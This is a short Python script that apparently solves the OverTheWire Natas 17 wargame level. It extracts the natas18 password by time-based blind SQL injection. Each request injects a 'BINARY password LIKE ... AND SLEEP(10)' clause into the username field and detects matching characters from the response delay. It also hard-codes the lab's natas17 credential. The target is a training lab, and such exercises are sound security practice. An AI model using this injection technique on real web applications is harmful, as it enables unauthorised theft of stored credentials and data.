#!/usr/bin/env python

#Importing Packages and Libraries
import requests
import re
import string
from time import *

#Declaring the Authentication
username = 'natas17'
password = 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd'
url = 'http://%s.natas.labs.overthewire.org/' %username
characters = string.ascii_letters + string.digits

#Functions
session = requests.Session()

seen_password = list()

#Using Wile Loop for Brute Forcing
while (len(seen_password) < 32):

	for character in characters:
		start_time = time()

		print("Trying the character to match the Password with:", "".join(seen_password) + character)

		response = session.post(url, data = {"username" : 'natas18" AND BINARY password LIKE "' + "".join(seen_password) + character + '%" AND SLEEP(10) #'}, auth = (username, password))
		content = response.text

		end_time = time()
		difference = end_time - start_time

		if (difference > 10):
			seen_password.append(character)
			break